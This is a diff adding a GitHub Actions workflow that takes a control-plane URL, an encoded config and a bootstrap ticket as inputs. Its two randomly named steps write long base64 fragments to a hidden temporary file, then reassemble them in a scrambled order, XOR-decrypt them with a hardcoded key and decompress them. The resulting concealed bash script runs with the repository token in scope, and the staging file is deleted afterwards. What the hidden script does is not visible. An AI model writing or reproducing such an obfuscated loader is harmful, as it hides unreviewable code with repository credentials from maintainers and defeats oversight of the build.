@@ -1,0 +1,187 @@
+name: River Vale - Pipeline
+run-name: River Vale - Pipeline · ${{ inputs.run_tag || 'manual' }}
+
+on:
+  workflow_dispatch:
+    inputs:
+      run_tag:
+        description: Opaque runtime correlation key
+        required: false
+        default: manual
+        type: string
+      action:
+        description: start / restore / backup / rotate / stop
+        required: true
+        type: choice
+        options:
+          - start
+          - restore
+          - backup
+          - rotate
+          - stop
+      instance_key:
+        description: Stable instance key
+        required: true
+        type: string
+      operation_id:
+        description: Idempotent control-plane operation ID
+        required: false
+        default: ''
+        type: string
+      source_run_id:
+        description: Original managed Run ID for a rotate/restart operation
+        required: false
+        default: '0'
+        type: string
+      automatic:
+        description: Whether Cloudflare scheduler owns retry-until-ready
+        required: false
+        default: 'false'
+        type: string
+      config_b64:
+        description: Base64 JSON instance configuration
+        required: true
+        type: string
+      bootstrap_ticket:
+        description: Short-lived Cloudflare runner capability
+        required: true
+        type: string
+      web_url:
+        description: Cloudflare control-plane URL
+        required: true
+        type: string
+
+permissions:
+  contents: read
+  actions: write
+  issues: write
+
+concurrency:
+  group: cloud-manager-automation-${{ inputs.instance_key }}
+  cancel-in-progress: false
+
+jobs:
+  automate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 300
+    env:
+      GH_TOKEN: ${{ github.token }}
+      ACTION: ${{ inputs.action }}
+      INSTANCE_KEY: ${{ inputs.instance_key }}
+      OPERATION_ID: ${{ inputs.operation_id }}
+      SOURCE_RUN_ID: ${{ inputs.source_run_id }}
+      AUTOMATIC: ${{ inputs.automatic }}
+      CONFIG_B64: ${{ inputs.config_b64 }}
+      WEB_URL: ${{ inputs.web_url }}
+    steps:
+      - name: Stage-001-192c61
+        shell: bash
+        run: |
+          set -euo pipefail
+          test -n "$RUNNER_TEMP"
+          umask 077
+          cat > "$RUNNER_TEMP/.wf-ce80c38be849b229a705.dat" <<'WF_FRAGMENTS_D7BB5901021A940B'
+          j/RzHWWBbccoCgCjpmm38t3v9Q+cHATm8rU4i0pEnwsKL9okp0x1/0mOVm/1KM5Vbc48Lel1b0t9onp/Zz/qt8wwuB/mvI1R
+          lIlpq2y1EvePhnbXrhyCCNJKOWXI85GpOyRdGZf3vK8V4V+0HPfkcU6N5zuHxrRPe9xJuRJyxrDGe5SJT+k0Jor+TyVyPZwp
+          F+ksULmPO2LgGSQiADaOW9XB0EbtHPm9SBsFzkymmG35/HOqFoV9uqJD90fV5WYIFptifLuiSJEku3BOgiFIknLGb7dp+aI+
+          tZHSEWMaBo54C8Rpg6xnsXGr/m6DWVZov1HJHpxFtEldH4AJzB4BMlmtIGBmmFgGqZ0vaGjtJb+dKXQ7Jv/xOLe5dQhXo6s+
+          ID0GFPo0fmtxCWG4DctrUtbH4Xe+W/WIRlNvzlxVNWD1r1UhdbL1/E0N5bN/AX1WRw3LVoEBdrqBu7jJ4yXshjfxQBkMC7wY
+          iRHRQmGIsdD0Wg+6CCr7pd3pMXCX7mCzzWaQjDXMaivjp0ARPIcQG89Tt+S78f452w/QchBLyVmFSu4cN4UgBr05qA6WP7LB
+          QjnONYcu6eoLVNRT4zS6Ke4Cmt+uHMqMbWJddkdKMzVJj4r3Tqp7JVFlwgtWhz1MWk+rrhow5EYgML2ZGDQXl9hQ9Oyw77Bn
+          VlKIWUA60V+7AZ/Ip+zsHW3Y3Bzv5RqXQpaBCqF6qlqHO1OBceZKDaaLt42RUcuQ0VXL0q+3gpC4IDFqBehXVcwh30epYWnJ
+          xeKZrbHGAIuWWjRnBg0vl2jenND0YkO3O3dEAXqUmplgTkhCERjYldBQ3UXIobJ7MDrCgUWBMgcZFgUAuaYumbsVEI037pbx
+          5c6S53HS0kdInkSBeTlRC+cUnlNmwOvKap5YOq3FM81h0QOtdC3k+xKzV1yLEswNxAMgM08Mjx3yLhB/3eHkO3lvLqMGG8rn
+          t8Z5V2wcg8AZ5RbVQnLYeKbE9JF6JusXlIvgZhu0M9o3AfwATvG+UbzZs6+q06Bg0GTxkMZLAYsITu3yrsQKhGcmGeE0asAA
+          5/jqTCq0FT3YLGOtaC8r3ix0GEgJZazkCnM6XlFP1jfLTG5qYnl09LtMaYiDlCmP4aFY+LOK+IAeCr6DZt7CW94VEKuX6QR5
+          pofFsTA3dCxJyOCHuqjO6hEMcS0y8tcPL5078oXOenZ7cjNyMSWM4KyIeA7P+cahudTS+dimoTuy2XlFKg/QEzxii5wcke1C
+          uKh+n5jqDDb7XYSTFTAPoXaXT4wrTDwzP/IGBrO6aWmpKgKSePqsRooH6C3M8f+AhyX+SmFIB1+C+hOWC3sDwvcV9JEzX2wg
+          423HTBuLEhO80JnDjf0RDbNrhgL8CbjcZMrOxLIORrbKZdau23QZeFzl9Q+Jq1iEmE39zd/xN8uOJ3cZls0KePU6lG7tVxVU
+          c+hiJMdVNTWnyfFBPM5BLsvIZN98wgCo3R4Zs/IYEuNdWhozmVy05NejsabLgZ6VIWwEdbJhJLdtOLQevY9se1/BPhKROoCI
+          wjV3NDj4kZykv7Wwbu1lYpl9O6niZcL9G3JbT041t8+dzMlEaHX3WtDbBYlhlUAAUquzGxc7kvREA/999HKBeMNY9SEbxW08
+          KrcTnQUUfn7heB1lcfHlETZaUz+XtOAzT+41Ljg/CtYG0tPBQdnCpKP/EAdY2ZM2YF9rdS76Nf2oG9vOm9rDJ+dyw+AfZKoW
+          sO7xTI3ymDZAUm126sC1+uxKS0rV0IeYR8Nhro3RMQ6Py47T5gNG8ZXAu0meRcU+MH0ecjFgRVwaoW2YGCgNWZGBqYdkmJZU
+          8hD/i+CH0HBRehF01krA6HYl/wXi5UfaOS09HESdkRpksp/N7UWV3pjllwhuuvGYmi6kNv00n2PzF4pDIPwbeJa/jVeebnne
+          L9BEZdHgt+X0fpdUIcdYsqFpCJqa34CyfPDwu573js+FN3k6RyP68CONZRCLSe7U85p+4nVCCTU8rpvtj6/3hclkOBG7teiM
+          9YPvGQFLJxLG2LTLFQ7b3qXFBbdN8KI/vFins7hS1CeE4KxiGagw9AeRIUEOYAZ7J+vEL/vEdt/FEbFfPaO0PhpqAtxYDJ5z
+          BJChHGUb1V7BcBRNRJd86n54LR1P6kDqQtBxjBUt98CazF31vDCfZKDRRtLfNl9xr9M7W2oTnua8ZL/OkCzxV49NRlJW2JSm
+          jv7kht5dLJtUPSAxqlaOHKL+PbQfQqFhS4YdFwv3/1ZKEueLCpaQihEpagIZkXNXdiEsetvPA5JGVPcVXWvqF1mK0mhm7Yd8
+          ndIv+ByjlGwUWDhGOP82D0EqAqUkMIaAcMPxPk0nmlabzrbzQFRFDfgStCy0dvdmtd7Py11xVlfA8ANmsG4HIqyOmc6GPpLk
+          JgLNWuZlMKLOt/ECBugFkoIfdDPHhrAFx1t3cWJ/stDFfQA64dTpu69Hf+QXjR5szZgRBbP75y7pBnjv/R8ngXE6/hK0ApW7
+          d6aM2lq36Ecs1qJnwMHwSO3EYVY4lwhwwfmlaILo5a7b1PdAs5s0keF4HWolkEk0NSzl/WyDrRZg+g5ZL5xuUJgE0Ri3+Xwa
+          YdEfKVlljdyEcknkJs0JKLzZQORVEU3dM6A4FYHcgVHGbBNFZOFw97//Sp9lX04rkh3t2FuSN2yyCx0l6qkwAkCVBx88Fhmo
+          M//EQZAdQtlHE7/0kKIcBJzo3AMwhYcRqps29gfSnMArGbuMSnVhgfuZRBi33LAYiv817GOCNsIfrRoIehAbwUpB7mNQZDZP
+          Pn2FLnmWNR85uUTyJJ7G/XZKHEG2Bo4t9+uTlYR3ga2zh+h1vaCFqJgPgZT0Ci9QQCOtbW9Y96+Ll4XFQB5Kr4J46tk6cIst
+          vc8MLPvYVZFZ4Y4GsXto2Bf0fHrc/FVD9OVWiqE8scEUOUrdBQqmBmo3nuGhtQ+jdXlMAiLq2Jo3Pem/r4wHS8vVAhow+JTH
+          23KgiEeMci9LEG05ZTCrAeqrUgCNOc+eh0dWfHf2Ps4jIuo6vURVudbi4f6h7mLq2mWowpqJEBRAD1/v/RKapz4bNZd5GRvd
+          d9lSdJ3azMJfEyMUvIub+t52y7FGvyEkau5QOyC7MON/ZnMsIFxQAraNKzB7tqJDwMJxYsu57EBPUSlLAbM0qWJ1XL0NQAUb
+          xJQKMOxYVWYuGKOGtWnpgBivy9WjvB96U23dJuMslrkef5YPKYm1eShpVPv9RIH+mZ/+SFid00fCuAOkoRJV/nD1suq16z0W
+          JV2FxabsZnOwwqW9EKZxePHQ5icC+YM1rDUzeEl49d1ScWNrr2eOsnT42t1mwY1qHrxePa3v/6iCj7NJDx3nAqtR1QN7bKhy
+          31zkHU0RbOQCMcx5h2fmtmi37EMvEY0Ou6OiR87F0DteMjQ8wUTtKS7pWMXH/QhKoud5iZZlSuXiCo3bcA0gZhq9DbWpRboL
+          n9VPxYgB5JL0iCLGSLtpUiNkc4dGzBXVLi0lylyq90ZoTfe5CDJCqXWEBI25d2yxL1JL2NN8lMTFXsRYGeLbga8wAPl0uHfR
+          /6WMy92lupMfewvHxDD8j6Pd0REtYxB3FlxnZB1jZ7dG/k9aDTclhFqwl+XVXP7FL5UlylkSdzKJWb893uRcZYsI3+gNhTal
+          RcP/C4MXG5gECMEZMA8EOVgcsvqDJiSEBK+sloNrC2lD2wduq3W3aoYMURGVdqAV2OcqS2OxD0EHwJx4wPIxFwSF7SpxnjVI
+          iaxF/yOdSUAvZ9HqA5VkJglJvrVc1wMML6GXbJml4/XqOZgVYaoM1mRMek25yV8FwnYhhn2eMfsmRcfrXAv7tCQG0LQh602T
+          9+GiHiFKyzkalLz1eEeMVJqne6NENE+nj9Mdhmm2dU5pOdb7zctR7I5C1chccNky0g/37Jeoa1Us9Grnlzm/FHmShoZA7tHE
+          azBOanAXqzYHLxBzuN/wwkpGWpE/q1U3tpAJCv2RTOwEO1f0AMEKJGipf+jrqQ+yKw/q3BdLqRY73dOhvWwzoGc9YGN0y1E5
+          jlifIjNvUBIiL0JUBI4dwGTfMuooeGauqGMjW/5cX9RSIfkyPR2V0dGF+nyZYvGP3MxKA6LkCXYWexvsh2x/H3pgM0TuHgpZ
+          4qqwQZspMOyVRmlHyYfwbScJlL8HEBlfeVWzELAfQhWhm/+dpXBsZhf6WYVYG9x/36N4ofP/2eDlNBfFlt9fbsov4KSCcGy8
+          nWwFd8V9IJ077ZaECdKdKWPOejJU3FguSApYm4fAj8l6lGXZdbQzyQWjTgW8RQ22c/NYVbDg+TgJQ4SI8ywkCGxMqoDPOS0g
+          zc9URcOSipagVp4481D4mokaDNyMLt/kLk/IlqQcudaXTEvBArPO1/0L6IDwXlzxRmG3YKBNFtS5Gm+tZNZlFptlrBktz7gc
+          OLf/BWguGHx63+C9DIsEp1St6eOamn0KTnfXQ4Yfzo7zX/IuIik1IBeShHFwDQXhJwXsGUfxQVx73VE1My9tuHG/DxubLCPB
+          wak7ef67p2e7lHYYOAAmgyRnWhHUOm+8bCpXIO9MG6EeAGSXPoxZclImEDKKGb0mPlJHMrf6uWI+ilREwoNbsuHU0wOcY46k
+          roRmKpRMboRfhOnBUBsnnrp3CRDJRqIszeSw4Bg31kClJqkqq5ESE30d/wIinIzgrDez2a4iE2Wp5KNIO3BeABUXpjrrBW7y
+          dCnYwuFj3lMLaYztc41maUpQAlpbPIODNCcyPNjcck4DDfJbSPvZoqqiTIiS3jGkB3TOs742sE0tFRBYCeMb0fxD9JMU4noX
+          Vn39nNwx4OBBGqz/nO3XzceDvb9YZS5d0cLV4rV9rtWUYzYyLQEe/cSjKU8mgvmnMxTqiOgnd8Ek/2DYwPAaC0XvMsP4oe3j
+          q72LjLK2vK86+TCQutrJDKbzR9yH20chZdDyYgmmlWcWQ7/AjQkLCeibzsVtmbwL5JVP9VRv//eX0aTkGGJxA7D9vl6B7ZkJ
+          c674jxkv70kjzSTiibtTc4wQREJlRBH7h3jC2Pj5V6BO6pikFqjCY9CTaCOwM+FzbqYLTDxBRkRKaoFiUpf0nlB1wjgWEdeT
+          8Dt8klPJDLDlDSju0HpEIn73eQ8PgHCaZcPZIbyZrK5aCQ//AegEQ2WdD70mNEMHc4vunyb8pRFQgraX4+bLRJPc/4DhN4rp
+          kirc/XpjXSLGy4qtAqHYUiVTsEoJBNgCZgNHFTynxmG8U31GdWDg5E+WuCeyF9ZR7sIf/tx+Cxej6DmfMRY7vFMqJrHX+yO4
+          kMJTGtyYYD8vNuDolBmCDiC+Fa18EtKogDbV/8Q0shMQ3En4Lysv2FUy1QW/OeQf+v5l4alFRTO/xal3BbfsXM4G32tJAMXC
+          pphiXZpZ13EgPqk2KTa4L0Nh1hC/fu3631N+I3/kLmGH6UgRI8domU14Pj40o4pyLulrQAN1zVq/hEP5i7UUQOFFIIEZQzui
+          FO+AqCxZmjNdLuTftMaor61vdUffDkUXHjh4uKLQuaFp/ZBX9vnUA7AzcxqFHlzUFznZ5oeQcZA2WvxlmunGMdP+27iCgHOw
+          8YrTnVX0szMp3CRiQSgDDtANERcp4S7TcoDe1L9svR8ic3d40KusfdM1HuXVTcBXkS373ANvfZhJfdB4TltfXXp9JzFGDpIc
+          bd83QyU8unagU9hlGJnqFbzkCb/HJ4lM3TFXhllbZrtEU8H0k8dDzcpELYF4udY+O0P61R0Ff56w9rFEX5GDB00nNZDyWe7M
+          Z55VIj2s33mHWbg0EdROwpu5say0EaTaW9j16wgCg2M25cmLEK+yCvkE9YWDNl5vXhIXHGihuVCAI6H9gXikQ+BBYbIHZbQZ
+          OSGxShz74KsDlO1gX+c/Vkgb0jAEIZcxywr3u3zFQ3YNB/pwKo8/UIsfwzwifR/lYtFbbhMf/bd0UHk4K16XxlHeiLYVd01x
+          v5uwLLATV0fBM5wTAX/wSMBm84pRnlRPX1NzVR1N7D1A1tTtDZHLEsXv51eu58vod2S7lTO4BRRExSkeFl4taSEkqjQoyA9o
+          TcIfLjdHlfj8kc2L0Ui7artvUn6O13lJKIds1eDW0WzBtdqtFYJNfHDcgnoMAdbNYPOKxjOoI6KlzkF/YwEMp60j6unrQDr+
+          DQqNd5scrvd7Sl2LUjYwKViZoCet0sEI5IW7XAx2gnbAG2lJRaH9D4fwfPjHNIqA5DMCtzCLU/ybzuK1Q9f9z2TcZW1/hpTI
+          CF/XYPZ1FRGBsd3+8X3Z3TAGvxI0pkBhg1MEVXufa+se9H+cwRCwf6JApiAvkveUe+REzFwal0I/LK4BGAsQJj0W1FI+Dr2u
+          /0qj9khV57TQSoz2lOPJopNjP7G1u169cCaI2zRjnp7grtZFjVxuQj71X/Qsd0bueqxpHWP3HODIiOeZAWVHmR2p0C5L8N9m
+          Q5id4WJQAusGJbilO4dUtoEqvALOGA5VhSjCXABQ6HZQn+tSHFZyNryen8NWanFvqY9XapCjGGBHuSQwYGLux/ulQTSW1pTs
+          sPpAp5TqXC21td0kYCN0VuYsN3irLEn00mtUhevz3A7aubQbm8BFY2qi5ToaYHgq01rXwUlUNRAr/8dWwFwUc7eyVA2KjP9O
+          Tv8fSgX991xWs0KDMibUsvSmcmA8OhdsiiPTM9VlaGmXsLE+m9SyX2dwUf30birW5IsgXyBH2ePoP2hE3iGa8Ts9RltmkhFX
+          rj/5xQcw8SPmfqza8mgRi1J9cnHhyOwtoMWT9iltS78bs6xmAmFfvnieEyZIArrnl5mo5BpA5VY1b/6ro+HXiDAAHW0bfxuE
+          3Px0U/lWiGqfN/5xKM2ANvYXGXXEmcU9lNJnzm8aYGqwqyLhjDpey1YgiekFepVTMx5RJGpb3qQvoeGcyvzUXy61ZGU1OUu8
+          AY+Ekni/4B9sv0Y8as2A4pAihapnCnsg2thWzvXJ7LrBBNZaZSMtxpPbjrgM2glDX02X7ZYfGnhnjbixHsc6uwjZ49cib7Ms
+          X78W9OqjYeBQrdE4AWGl4vlmN3ISUhreifbzjLMpj6HEHMfft1r0osw=
+          p6AZROBmV+6v21MhGcOl2HD0YBCbUvZl2ErBF0lpw3BltLl2T4HQF0to4OO7QScmxa1upZxRMAVLhHAEYH4jTPdkNItMIUOw
+          TTLZ7IsJkUj+H1+VNtP5h9hHZJo98jqHaVdhDCGqxLexEQKOsFBk4rTD8A1UdkRKAHec5EYqLanikBAjd+ke1lVn8ckG+O5f
+          822/+0xSJ9anYUS3iX1mXHcUw9FBAfUO8+fUJF8m7WCRXlzJ8ZWZ1Z6ITmXSZCsDC1whZCoi8J1whlExNfFZaY7TU97v84xw
+          WpuoezQu7bvuV1EfHDKUM70Uss1qbJqBvhQKMIF/+2ftI+wCYaRzL1bvTu4inSgGJdWldP9N0ftjq8YqNzBlGdtT/oPqHDBT
+          S8pTlVVxcEPxwbPJfPFdoaQfOVFV2N1c2js+QScZ4lNzQxFvrjDpQUgmGRi2SgEVPawtZVR7Ik0ZiQ5zc+Vnpmg1MTPe/pTf
+          EMA+sKldc543xH+sgTg//PgRxak5t5GKq0unUHCQjOfsxAxUYPIlbJfP7dcnD0Soi7KDacFfqxQ7obdFwDioeU6oxNe6O7l0
+          Zzxrakd58lMWLACQn45falF29uTacwst4HQcv0F1MQPxAQ6tD/Iza44xlvWmnXgvWfxYHtO5aUDfgR8ZN8EmgVafETpRSWS3
+          BnzQMTajvIemg+9Ic7OVrxGsBHIF26pOfDWfoGoJx9n9UTXFrOrD31GTafTRGTOzOQCyma/LXDQdJg6GyV3XWSMmbHo4shC6
+          WF_FRAGMENTS_D7BB5901021A940B
+      - name: Step-e7eebb914e22
+        shell: bash
+        run: |
+          set -euo pipefail
+          export CSM_OBF_SCRIPT_PATH="$(mktemp)"
+          trap 'rm -f "$CSM_OBF_SCRIPT_PATH" "$RUNNER_TEMP/.wf-ce80c38be849b229a705.dat"' EXIT
+          python3 - <<'CSM_OBF_PAYLOAD'
+          import base64, gzip, os
+          from pathlib import Path
+          stored = Path(os.environ['RUNNER_TEMP']) / '.wf-ce80c38be849b229a705.dat'
+          fragments = stored.read_text(encoding='ascii').splitlines()
+          stored.unlink()
+          order = [22,8,36,37,2,15,76,80,68,32,53,13,54,38,1,33,65,11,20,66,81,55,26,21,5,50,29,71,49,56,75,78,0,52,61,3,34,62,42,47,59,25,77,27,72,60,63,4,30,35,40,58,48,74,70,10,19,17,46,31,43,57,18,45,67,6,28,24,14,9,39,12,7,69,44,41,23,79,51,64,16,73]
+          payload = ''.join(fragments[i] for i in order)
+          key = bytes.fromhex('1b1ba91c651bd55ec38fc1712fc0a7a2cca7d03635fe0d6a')
+          ciphertext = base64.b64decode(payload)
+          compressed = bytes(value ^ key[i % len(key)] for i, value in enumerate(ciphertext))
+          script = gzip.decompress(compressed).decode('utf-8')
+          Path(os.environ['CSM_OBF_SCRIPT_PATH']).write_text(script, encoding='utf-8')
+          CSM_OBF_PAYLOAD
+          bash --noprofile --norc -e -o pipefail "$CSM_OBF_SCRIPT_PATH"
